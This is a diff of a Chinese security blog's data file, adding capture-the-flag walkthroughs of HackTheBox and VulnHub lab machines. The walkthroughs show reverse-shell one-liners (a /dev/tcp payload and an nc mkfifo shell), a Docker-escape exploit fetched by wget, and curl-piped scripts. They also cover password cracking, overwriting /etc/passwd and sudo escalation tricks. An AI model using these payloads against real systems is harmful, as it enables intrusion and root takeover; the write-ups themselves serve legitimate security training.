+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out privKey.key 1024</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_privkey.png" alt="privkey"></p>
+<p>用python3在本地起一个服务，让目标从本机获取私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7070</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwtfake.png" alt="jwtfake"></p>
+<p>用生成的jwt令牌替换原来的，访问/<code>admin</code>，成功进入管理员界面</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_admin.png" alt="admin"></p>
+<p>管理员界面有两个功能（查看Notes和文件上传）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/viewnote.png" alt="viewnote"></p>
+<p>管理员能同时查看所有注册用户和Admin的notes，其中有两篇中泄露了部分信息供参考</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_php.png" alt="php"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backups.png" alt="backups"></p>
+<p>①存在PHP文件执行的问题需要解决 ②服务器上有备份</p>
+<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>如果可以运行php文件，那么我们可以通过PHP文件执行的问题来上传一个php文件反弹shell</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell.png" alt="uploadshell"></p>
+<p>上传shell.php查看文件成功收到反弹回来的shell，升级为交互式shell（关于交互式和非交互式shell的区别可以自行百度）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null -q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</span><br><span class="line">export TERM=xterm #运行xterm 一种终端</span><br><span class="line">ctrl+z #netcat挂后台</span><br><span class="line">stty raw -echo;fg #stty raw 设置原始输入 -echo 禁止回显，当您在键盘上输入时，并不出现在屏幕上 将本地终端置于原始模式，以免干扰远程终端</span><br><span class="line">reset #重置远程终端</span><br><span class="line">或者</span><br><span class="line">script /dev/null  //这是偷懒的方法，用起来不是很方便，但是像su之类的命令都可以执行</span><br><span class="line">或者</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; //需要python环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_%E4%BA%A4%E4%BA%92%E5%BC%8Fshell.png" alt="交互式shell"></p>
+<p>查看<code>/etc/passwd</code>中看到有个<code>noah</code>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/finduser.png" alt="finduser"></p>
+<p>从上面我们可以发现已经提示过有备份文件，访问<code>/var/backups</code>，发现备份文件<code>home.tar.gz</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/findbackups.png" alt="findbackups"></p>
+<p>因为目标服务器上有python3环境，可以起一个web服务，把备份文件<code>home.tar.gz</code>下载到本机</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/receivetar.png" alt="receivetar"></p>
+<p>解压备份文件发现里面有<code>noah</code>用户的SSH密钥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_idrsa.png" alt="idrsa"></p>
+<p>通过SSH连接<code>10.10.10.230</code>，在桌面可以得到<code>user.txt</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/noah.png" alt="noah"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>查看用户当前用户可执行的指令，用户可以不需要密码在docker容器执行部分命令</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_sudo.png" alt="sudo"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp_dev01 xxx</span><br></pre></td></tr></table></figure>
+
+<p>查看docker版本为<strong>18.06.0-ce</strong>,google搜一波发现了CVE-2019-5736docker容器逃逸漏洞</p>
+<p>参考：</p>
+<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html</a></p>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>runC是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI(command-line interface) 工具。runC是Docker中最为核心的部分，容器的创建、运行、销毁等操作最终都是通过调用runC完成。</p>
+<p>CVE-2019-5736，导致18.09.2版本之前的Docker允许恶意容器覆盖宿主机上的runC二进制文件，由此使攻击者能够以root身份在宿主机上执行任意命令。恶意容器需满足以下两个条件之一:</p>
+<p>(1)由一个攻击者控制的恶意镜像创建</p>
+<p>(2)攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p>
+<p>POC的利用需要在容器内拥有root，由于覆盖了<code>/bin/sh</code>所以当我们把修改好Payload的二进制文件main下载到docker中执行，下次再有人调用docker容器中的<code>/bin/sh</code>就会触发Payload。</p>
+<p>通过修改payload反弹一个shell到本机以获得root</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.SSH连接到目标主机，通过<code>sudo docker exec -it webapp-dev01 bash</code>在docker上执行命令，（暂且称之为SSH1）同时用另一个在另一个命令行窗口SSH连接到目标主机（SSH2）</p>
+<p>2.在本地改好修改好Payload，执行<code>go build main.go</code>生成二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.16.11/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/maingo.png" alt="maingo"></p>
+<p>3.在二进制文件所在目录用python起一个web服务</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_webserver.png" alt="webserver"></p>
+<p>4.在docker容器中执行命令从本机获取二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.16.11:8000/main</span><br></pre></td></tr></table></figure>
+
+<p>5.赋予二进制文件最高权限，并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x main &amp;&amp; ./main</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh1main.png" alt="ssh1main"></p>
+<p>6.监听9999端口（端口根据payload里面的来）</p>
+<p>7.在SSH1中二进制文件运行并覆盖完成<code>/bin/sh</code>，SSH2执行如下命令即可收到反弹回来的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp-dev01 /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh2.png" alt="ssh2"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_rootshell.png" alt="rootshell"></p>
+<p>root.txt在<code>/root</code>目录下</p>
+<p>如果流程看不懂，还有终极图解方便理解（文字表达能力较差，各位师傅多担待）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E5%85%A8%E5%B1%80.png" alt="全局"></p>
+<p>可能出现问题的点估计就是提权了，我也好久弹不出Shell…</p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python库劫持</title>
     <url>/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/</url>
     <content><![CDATA[<h1 id="Python库劫持"><a href="#Python库劫持" class="headerlink" title="Python库劫持"></a>Python库劫持</h1><p>之前在做VulnHub的时候需要利用<strong>Python库劫持</strong>具体学习一下</p>
@@ -902,6 +902,223 @@
       <tags>
         <tag>Python</tag>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub-Empire:LupinOne</title>
+    <url>/2022/01/17/VulnHub-Empire-LupinOne/</url>
+    <content><![CDATA[<h1 id="VulnHub-Empire-LupinOne"><a href="#VulnHub-Empire-LupinOne" class="headerlink" title="VulnHub-Empire: LupinOne"></a>VulnHub-Empire: LupinOne</h1><p><strong>Level: Easy-Medium</strong></p>
+<span id="more"></span>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111192526980.png" alt="image-20220111192526980"></p>
+<p>开放22、80端口，同时<code>robots.txt</code>中提示有个名为<code>/~myfiles</code>的目录</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111194123394.png" alt="image-20220111194123394"></p>
+<p>假的404页面</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111193628871.png" alt="image-20220111193628871"></p>
+<p>查看源码发现提示信息”Your can do it, keep trying.”</p>
+<h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111195222767.png" alt="image-20220111195222767"></p>
+<p>通过fuzz发现了另外一个目录<code>~secret</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111195711410.png" alt="image-20220111195711410"></p>
+<p>筛选一下有用的信息</p>
+<blockquote>
+<p>疑似用户名：icex64 </p>
+<p>这个目录下藏有ssh的私钥</p>
+<p>用 fasttrack 破解密码</p>
+</blockquote>
+<p>继续fuzz</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u &quot;http://192.168.221.131/~secret/.FUZZ&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403 -e .txt,.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201339971.png" alt="image-20220111201339971"></p>
+<p>发现了<code>.mysecret.txt</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201618284.png" alt="image-20220111201618284"></p>
+<p>直接看不像是private key应该是编码过了，试了几种Base发现是base58 <a href="http://www.hiencode.com/base58w.html">解码点这</a></p>
+<p>解码后得到sshkey</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201903152.png" alt="image-20220111201903152"></p>
+<h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><p>利用ssh2john获取sshkey的哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py sshkey &gt; hash</span><br></pre></td></tr></table></figure>
+
+<p>再用John破解得到密码为<strong>P@55w0rd!</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111205221667.png" alt="image-20220111205221667"></p>
+<p>通过已知用户<strong>icex64</strong>连接ssh，获得一个flag</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112132931220.png" alt="image-20220112132931220"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>发现用户有权以<strong>arsene</strong>身份运行<strong>heist.py</strong>且免密</p>
+<p>查看<strong>webbrowser.py</strong>为任意用户可读写执行，利用python库劫持来利用该文件</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112134653023.png" alt="image-20220112134653023"></p>
+<h3 id="Python库劫持"><a href="#Python库劫持" class="headerlink" title="Python库劫持"></a>Python库劫持</h3><p>Python库劫持的方法后续会再写一篇文章来详细学习一下</p>
+<p>这里因为<strong>heist.py</strong>调用了<strong>webbrowser.py</strong>且该文件任意用户可写，直接在该文件中调用<code>/bin/bash</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112145242986.png" alt="image-20220112145242986"></p>
+<p>现在可以直接通过<strong>heist.py</strong>来切换为<strong>arsene</strong>用户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用pip来Getshell"><a href="#利用pip来Getshell" class="headerlink" title="利用pip来Getshell"></a>利用pip来Getshell</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112150413564.png" alt="image-20220112150413564"></p>
+<p>简单看看<strong>arsene</strong>用户目录下，其中<strong>note.txt</strong>就是先前网页上看到的提示信息，其他没啥有用的</p>
+<p><code>sudo -l</code>发现用户有权以 <strong>root</strong> 身份执行<strong>pip</strong>且免密</p>
+<p>在<a href="https://gtfobins.github.io/">GTFOBins</a>上直接就有pip提权的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">pip install $TF</span><br></pre></td></tr></table></figure>
+
+<p>这里直接利用以上三条命令就可获得root权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112152050911.png" alt="image-20220112152050911"></p>
+<p>root flag在**/root**目录下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112152225053.png" alt="image-20220112152225053"></p>
+<p>end</p>
+]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub-EvilBox</title>
+    <url>/2022/01/12/VulnHub-EvilBox/</url>
+    <content><![CDATA[<h1 id="VulnHub-EvilBox"><a href="#VulnHub-EvilBox" class="headerlink" title="VulnHub-EvilBox"></a>VulnHub-EvilBox</h1><p><strong>Level: Easy</strong></p>
+<span id="more"></span>
+
+<h2 id="Before-Start"><a href="#Before-Start" class="headerlink" title="Before Start"></a>Before Start</h2><p>用VMware导入ovf发现靶机没有IP时的处理方法如下：</p>
+<p>在下图载入界面时按e</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154334064.png" alt="image-20220106154334064"></p>
+<p>把<code>ro</code>改成<code>rw signie init=/bin/bash </code>，修改完毕Ctrl+x重启服务</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154632629.png" alt="image-20220106154632629"></p>
+<p>进入如下界面以后用vi修改网卡配置文件，<code>vi  /etc/network/interfaces</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154742384.png" alt="image-20220106154742384"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106154858822.png" alt="image-20220106154858822"></p>
+<p>把网卡改成ens33即可，重启网卡服务<code>/etc/init.d/networking restart</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106155532979.png" alt="image-20220106155532979"></p>
+<p>重启靶机虽然没有显示IP但是问题已经解决了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106160625267.png" alt="image-20220106160625267"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106160741944.png" alt="image-20220106160741944"></p>
+<p>开放22、80端口</p>
+<h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106181809019.png" alt="image-20220106181809019"></p>
+<p>发现<code>robots.txt</code>和<code>secret</code>，依次访问结果如下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106181933222.png" alt="image-20220106181933222"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106182035033.png" alt="image-20220106182035033"></p>
+<p>加上<code>/secret</code>继续爆破，发现<code>evil.php</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106182312683.png" alt="image-20220106182312683"></p>
+<p>访问<code>evil.php</code>还是个空白页</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220106182436881.png" alt="image-20220106182436881"></p>
+<p>fuzz一下发现存在文件包含，GET参数为<strong>command</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107140908040.png" alt="image-20220107140908040"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h3><p>通过<code>php://filter/convert.base64-encode/resource=evil.php</code>查看<code>evil.php</code>源码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件包含没错了，可以看看其他目录是否存在敏感文件</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/[KTE3AA07]O75A1%7BEM1ETI9.jpg" alt="img"></p>
+<h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><p>在<code>/home/mowree/.ssh/</code>目录下可以获得私钥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107142131515.png" alt="image-20220107142131515"></p>
+<p>用ssh2john.py获取一下hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py id_rsa &gt; hash.txt</span><br></pre></td></tr></table></figure>
+
+<p>再用john进行破解，得到密码为<strong>unicorn</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john ~/桌面/hash.txt -w /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107143509973.png" alt="image-20220107143509973"></p>
+<p>使用ssh连接获得user.txt</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107144251045.png" alt="image-20220107144251045"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>简单尝试没有sudo提权</p>
+<p>发现/etc/passwd文件任意用户可以读写</p>
+<p>那么提权的方式就很多了</p>
+<blockquote>
+<p>1、自己添加一个拥有root权限的用户</p>
+<p>2、修改root用户的密码</p>
+</blockquote>
+<p>我这里直接修改了root用户本身的密码为root</p>
+<p>先用openssl生成密码为：root （密码随意）的哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 root</span><br></pre></td></tr></table></figure>
+
+<p>直接修改<code>/etc/passwd</code>文件即可</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220107145912769.png" alt="image-20220107145912769"></p>
+<p>end</p>
+]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub-DarkHole2</title>
+    <url>/2022/01/20/VulnHub-DarkHole2/</url>
+    <content><![CDATA[<h1 id="VulnHub-DarkHole2"><a href="#VulnHub-DarkHole2" class="headerlink" title="VulnHub-DarkHole2"></a>VulnHub-DarkHole2</h1><p><strong>Level: Medium-Hard</strong></p>
+<span id="more"></span>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><p>本次的环境不同以往的点在于不知道目标的IP，所以先用netdiscover进行网络扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -i 192.168.221.0/16</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120194130792.png" alt="image-20220120194130792"></p>
+<p>发现目标IP为<strong>192.168.221.133</strong></p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120194759005.png" alt="image-20220120194759005"></p>
+<p>开放22、80端口，存在<strong>http-git</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120195541319.png" alt="image-20220120195541319"></p>
+<p>直接访问发现<strong>Git泄露</strong></p>
+<h3 id="git-dumper"><a href="#git-dumper" class="headerlink" title="git-dumper"></a>git-dumper</h3><p>类似的工具都行，主要是把.git目录down下来</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120201405775.png" alt="image-20220120201405775"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log</span><br><span class="line">git diff a4d900a8d85e8938d3601f3cef113ee293028e10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120202700671.png" alt="image-20220120202700671"></p>
+<p>用git命令发现了邮箱以及密码</p>
+<blockquote>
+<p>Email：<a href="mailto:&#108;&#x75;&#115;&#x68;&#64;&#97;&#100;&#x6d;&#x69;&#110;&#x2e;&#x63;&#x6f;&#x6d;">&#108;&#x75;&#115;&#x68;&#64;&#97;&#100;&#x6d;&#x69;&#110;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
+<p>Password：321</p>
+</blockquote>
+<p>通过备份下来的文件可知存在登陆界面，利用获得的邮箱密码登录</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120203339458.png" alt="image-20220120203339458"></p>
+<p>对GET参数id进行简单测试猜测可能存在SQL注入</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><strong>Burpsuite</strong>抓包用<strong>sqlmap</strong>跑一下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120204122563.png" alt="image-20220120204122563"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r test --dbs</span><br><span class="line">sqlmap -r test -D darkhole_2 --table</span><br><span class="line">sqlmap -r test -D darkhole_2 -T ssh --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120204423858.png" alt="image-20220120204423858"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120205214748.png" alt="image-20220120205214748"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120205317753.png" alt="image-20220120205317753"></p>
+<p>可以尝试SSH连接了</p>
+<blockquote>
+<p>user：jehad</p>
+<p>password：fool</p>
+</blockquote>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120210247227.png" alt="image-20220120210247227"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>没有可利用脚本</p>
+<p>返回上级目录发现了有另外两个用户<strong>lama</strong>和<strong>losy</strong>，不出意外需要获得它们的权限</p>
+<p>使用<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>找一下受害机上潜在的提权方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</span><br></pre></td></tr></table></figure>
+
+<p>从LinePEAS收集到的信息中发现，<strong>losy</strong>用户localhost的9999端口运行了一个php服务</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124162955923.png" alt="image-20220124162955923"></p>
+<p>访问<code>/opt/web</code>目录</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124163212182.png" alt="image-20220124163212182"></p>
+<p>进行本地端口转发，这样就可以在本地访问<strong>index.php</strong>，再进行cmd传参</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jehad@192.168.221.133 -L 9999:localhost:9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124164135872.png" alt="image-20220124164135872"></p>
+<p>在<strong>losy</strong>用户目录下找到flag</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124164601654.png" alt="image-20220124164601654"></p>
+<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>直接反弹shell似乎行不通，用工具对命令进行url编码成功反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.221.128 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124171444067.png" alt="image-20220124171444067"></p>
+<p>可以用python起个bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/home/losy</code>目录下发现了<code>.bash_history</code>查看内容</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/DarkHole2.png" alt="DarkHole2"></p>
+<p>找到了<strong>losy</strong>的密码</p>
+<blockquote>
+<p>losy:gang</p>
+</blockquote>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124173906401.png" alt="image-20220124173906401"></p>
+<p>通过sudo可以使用root权限执行python3，用上面python起bash的命令就可以拿到root权限了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124174252068.png" alt="image-20220124174252068"></p>
+<p>flag在<code>/root</code>目录下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124174353936.png" alt="image-20220124174353936"></p>
+<p>end</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在渗透中信息收集真的非常重要，第一次用LinPEAS工具，自动化的信息收集确实很方便</p>
+<p>所知反弹shell的方法还是有所欠缺，需要后需加强学习</p>
+<p>参考链接：<a href="https://www.jianshu.com/p/913067492f05">https://www.jianshu.com/p/913067492f05</a></p>
+]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1283,71 +1500,6 @@
         <tag>Python</tag>
         <tag>sqlmap</tag>
         <tag>工具分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VulnHub-Empire:LupinOne</title>
-    <url>/2022/01/12/VulnHub-Empire-LupinOne/</url>
-    <content><![CDATA[<h1 id="VulnHub-Empire-LupinOne"><a href="#VulnHub-Empire-LupinOne" class="headerlink" title="VulnHub-Empire: LupinOne"></a>VulnHub-Empire: LupinOne</h1><p><strong>Level: Easy-Medium</strong></p>
-<span id="more"></span>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111192526980.png" alt="image-20220111192526980"></p>
